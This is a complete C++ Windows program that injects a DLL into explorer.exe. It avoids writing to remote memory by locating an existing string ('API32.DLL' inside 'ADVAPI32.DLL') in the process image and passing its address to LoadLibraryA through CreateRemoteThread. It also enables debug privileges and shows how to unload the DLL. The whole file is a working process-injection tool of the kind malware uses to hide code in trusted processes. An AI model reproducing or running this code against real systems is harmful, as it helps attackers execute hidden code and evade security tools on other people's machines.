// AlternativeCreateRemoteThread.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

DWORD FindStringAndGetVA( LPWSTR lpszFileName, const char * szASCIIString )
{
	HANDLE hFile = NULL;
	DWORD dwSize = 0;
	DWORD dwNumberOfBytesRead = 0;
	LPBYTE lpBuffer = NULL;
	char *szString = NULL;
	DWORD dwStringOffset = 0;
	DWORD dwStringOffsetVA = 0;
	PIMAGE_DOS_HEADER pDosHeader = NULL;
	PIMAGE_NT_HEADERS32 pNtHeader = NULL;
	PIMAGE_SECTION_HEADER pSection = NULL;

	//
	// loads file into the memory and re-calculates the virtual offset for the string
	//
	hFile = CreateFileW( lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL );
	if ( hFile != INVALID_HANDLE_VALUE )
	{
		//
		// load file
		//
		dwSize = GetFileSize( hFile, NULL );
		lpBuffer = new BYTE[ dwSize ];
		if ( ReadFile( hFile, lpBuffer, dwSize, &dwNumberOfBytesRead, NULL ) && dwNumberOfBytesRead == dwSize )
		{
			//
			// find string
			//
			for ( DWORD n = 0; n < dwSize; n++ )
			{
				//
				// search for this string ( yes I know, its not the best but whatever... )
				//
				szString = (char*)(lpBuffer + n);
				if ( szString && _stricmp( szString, szASCIIString ) == 0 )
				{
					dwStringOffset = (DWORD)szString - (DWORD)lpBuffer;
					break;
				}
			}

			//
			// recalculate FileOffset to VA
			//
			if ( dwStringOffset )
			{
				dwStringOffsetVA = dwStringOffset;
				pDosHeader = (PIMAGE_DOS_HEADER)lpBuffer;
				if ( pDosHeader && pDosHeader->e_magic == IMAGE_DOS_SIGNATURE )
				{
					pNtHeader = (PIMAGE_NT_HEADERS32) ((DWORD_PTR)lpBuffer + (DWORD_PTR)(pDosHeader->e_lfanew) );
					if ( pNtHeader && pNtHeader->Signature == IMAGE_NT_SIGNATURE )
					{
						//
						// scan sections
						//
						for ( WORD n = 0; n < pNtHeader->FileHeader.NumberOfSections; n++ )
						{
							pSection = (PIMAGE_SECTION_HEADER)( (DWORD_PTR)lpBuffer + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32) + (n * sizeof(IMAGE_SECTION_HEADER) ) );
							if ( pSection && dwStringOffset >= pSection->PointerToRawData && dwStringOffset < (pSection->PointerToRawData + pSection->SizeOfRawData) )
							{
								dwStringOffsetVA = dwStringOffset - pSection->PointerToRawData + pSection->VirtualAddress;
								break;
							} 
							else if ( n == 0 && dwStringOffset < pSection->PointerToRawData )
							{
								// stop if offset is < first section
								break;
							}
						}
					}
				}
			}
		}
		delete[] lpBuffer;
		CloseHandle( hFile );
	}
	return dwStringOffsetVA;
}

BOOL RemoteLoadLibraryUserland( const WCHAR * szProcessName, const char * szDLLName )
{
	BOOL fResult = FALSE;
	HANDLE hSnapshot = NULL, hSnapshot2 = NULL;
	PROCESSENTRY32W pe = { 0 };
	MODULEENTRY32W me = { 0 };
	HANDLE hProcess = NULL, hThread = NULL;
	DWORD dwThreadId = 0;
	FARPROC fLoadLibrary = NULL;
	DWORD dwOffsetForMyDLLString = 0;
	

	//
	// find process where we want to inject our DLL
	//

	hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if ( hSnapshot != INVALID_HANDLE_VALUE )
	{
		pe.dwSize = sizeof(PROCESSENTRY32W);
		if ( Process32FirstW( hSnapshot, &pe ) )
		{
			do
			{
				//
				// find process
				//
				if ( _wcsnicmp( pe.szExeFile, szProcessName, wcslen(pe.szExeFile) ) == 0 )
				{
					//
					// search as next for one thread in this process and open it
					//
					hSnapshot2 = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, pe.th32ProcessID );
					if ( hSnapshot2 != INVALID_HANDLE_VALUE )
					{
						me.dwSize = sizeof(MODULEENTRY32W);
						if ( Module32First( hSnapshot2, &me ) )
						{
							//
							// search our DLL string in this module
							//
							dwOffsetForMyDLLString = FindStringAndGetVA( me.szExePath, szDLLName );

							if ( dwOffsetForMyDLLString )
							{
								//
								// add the handle of the module to the offset and open process
								//
								dwOffsetForMyDLLString += (DWORD)me.hModule;

								hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID );
								if ( hProcess )
								{
									//
									// and now simply execute the thread
									//
									fLoadLibrary = GetProcAddress( LoadLibraryW( L"KERNEL32.DLL" ), "LoadLibraryA" );
									if ( fLoadLibrary )
									{
										hThread = CreateRemoteThread( hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)fLoadLibrary, (LPVOID)dwOffsetForMyDLLString, 0, &dwThreadId );
										if ( hThread )
										{
											WaitForSingleObject( hThread, INFINITE );
											fResult = TRUE;
											CloseHandle( hThread );
										}
									}
									CloseHandle( hProcess );
								}
							}
						}
						CloseHandle( hSnapshot2 );
					}
					break;
				}
			} while ( Process32NextW( hSnapshot, &pe ) );
		}
		CloseHandle( hSnapshot );
	}
	return fResult;
}

BOOL RemoteFreeLibrary( const WCHAR * szProcessName, const WCHAR * szModuleName )
{
	BOOL fResult = FALSE;
	HANDLE hSnapshot = NULL, hSnapshot2 = NULL;
	PROCESSENTRY32W pe = { 0 };
	MODULEENTRY32W me = { 0 };
	HANDLE hProcess = NULL, hThread = NULL;
	HMODULE hFreeModule = NULL;
	DWORD dwThreadId = 0;
	FARPROC fFreeLibrary = NULL;

	//
	// find process where we want to inject our DLL
	//

	hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if ( hSnapshot != INVALID_HANDLE_VALUE )
	{
		pe.dwSize = sizeof(PROCESSENTRY32W);
		if ( Process32FirstW( hSnapshot, &pe ) )
		{
			do
			{
				//
				// find process
				//
				if ( _wcsnicmp( pe.szExeFile, szProcessName, wcslen(pe.szExeFile) ) == 0 )
				{
					//
					// search as next for one thread in this process and open it
					//
					hSnapshot2 = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, pe.th32ProcessID );
					if ( hSnapshot2 != INVALID_HANDLE_VALUE )
					{
						me.dwSize = sizeof(MODULEENTRY32W);
						if ( Module32First( hSnapshot2, &me ) )
						{
							do
							{
								if ( _wcsnicmp( me.szModule, szModuleName, wcslen(me.szModule) ) == 0 )
								{
									//
									// open process
									//
									hFreeModule = me.hModule;
									hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID );
									if ( hProcess )
									{
										//
										// and now simply execute the thread
										//
										fFreeLibrary = GetProcAddress( LoadLibraryW( L"KERNEL32.DLL" ), "FreeLibrary" );
										if ( fFreeLibrary )
										{
											hThread = CreateRemoteThread( hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)fFreeLibrary, (LPVOID)hFreeModule, 0, &dwThreadId );
											if ( hThread )
											{
												WaitForSingleObject( hThread, INFINITE );
												fResult = TRUE;
												CloseHandle( hThread );
											}
										}
										CloseHandle( hProcess );
									}
									break;
								}
							} while ( Module32Next( hSnapshot2, &me ) );
						}
						CloseHandle( hSnapshot2 );
					}
					break;
				}
			} while ( Process32NextW( hSnapshot, &pe ) );
		}
		CloseHandle( hSnapshot );
	}
	return fResult;
}

BOOL SetDebugPrivileges()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tpPriv;
	BOOL fResult = FALSE;

	if ( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
	{
		if ( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &tpPriv.Privileges[0].Luid ) )
		{
			tpPriv.PrivilegeCount = 1;
			tpPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if ( AdjustTokenPrivileges( hToken, FALSE, &tpPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL ) )
			{
				fResult = TRUE;
			}
		}
		CloseHandle( hToken );
	}
	return fResult;
} 

int _tmain(int argc, _TCHAR* argv[])
{
	//
	// API32.DLL is the DLL we will inject. Why API32.DLL? Because this string is already in EXPLORER.EXE ( Windows XP SP3 ): ADVAPI32.DLL
	//
	// first you must drop your DLL to the right directory, e.g:
	//
	//		DropDLL( "C:\\WINDOWS\\API32.DLL" );
	// 
	// and later you can run this Code:
	//
	if ( !SetDebugPrivileges() )
		printf( "Warning: NO DEBUG PRIVILEGES!\n" );

	printf( "Userland RemoteLoadLibrary: " );
	if ( RemoteLoadLibraryUserland( L"explorer.exe", "API32.DLL" ) )
	{
		printf( "INJECTED\n" );
		Sleep( 2 * 1000 );

		printf( "Unloading DLL: " );
		if ( RemoteFreeLibrary( L"explorer.exe", L"API32.DLL" ) )
		{
			Sleep( 2 * 1000 );
			printf( "DLL UNLOADED!\n" );
		}
		else
		{
			printf( "FAILED!\n" );
		}
	}
	else
	{
		printf( "FAILED\n" );
	}

	return 0;
}
